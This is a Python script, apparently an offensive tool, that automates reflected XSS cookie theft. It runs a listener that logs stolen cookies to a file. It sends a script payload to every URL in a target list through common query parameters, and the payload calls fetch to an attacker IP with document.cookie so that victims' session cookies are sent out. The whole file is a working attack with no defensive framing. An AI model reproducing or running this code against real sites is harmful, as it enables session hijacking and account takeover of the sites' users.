import sys, threading, time, json, socket, urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor
import requests

LISTEN_PORT = 8080
STOLEN = []
REPORT_FILE = "xss_report.json"

class XSSHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): return
    def do_GET(self):
        global STOLEN
        if 'c=' in self.path:
            raw = urllib.parse.unquote(self.path.split('c=')[1].split(' ')[0])
            STOLEN.append(raw)
            with open("stolen_cookies.txt","a") as f:
                f.write(raw+"\n")
            print(f"\033[91m[COOKIE] {raw[:80]}\033[0m")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<html><body><script>alert('Stolen');</script></body></html>")

def start_listener():
    HTTPServer(('0.0.0.0', LISTEN_PORT), XSSHandler).serve_forever()

def scan_targets(target_file):
    with open(target_file) as f:
        targets = [l.strip() for l in f if l.strip()]
    payload_template = "<script>fetch('http://YOUR_IP:{}/?c='+document.cookie)</script>"
    for t in targets:
        for param in ['q','s','search','name','id']:
            url = f"{t}?{param}={urllib.parse.quote(payload_template.format(LISTEN_PORT))}"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code == 200:
                    print(f"\033[92m[INJECTED] {url[:80]}\033[0m")
            except: pass

if __name__ == "__main__":
    if len(sys.argv)<2:
        print(f"Usage: {sys.argv[0]} <targets.txt>")
        sys.exit(1)
    threading.Thread(target=start_listener, daemon=True).start()
    print(f"\033[93m[LISTENER] http://0.0.0.0:{LISTEN_PORT}\033[0m")
    time.sleep(1)
    scan_targets(sys.argv[1])
    input("\033[96mPress Enter to save report...\033[0m")
    with open(REPORT_FILE,"w") as f:
        json.dump(STOLEN, f, indent=2)
    print(f"Report saved to {REPORT_FILE}")
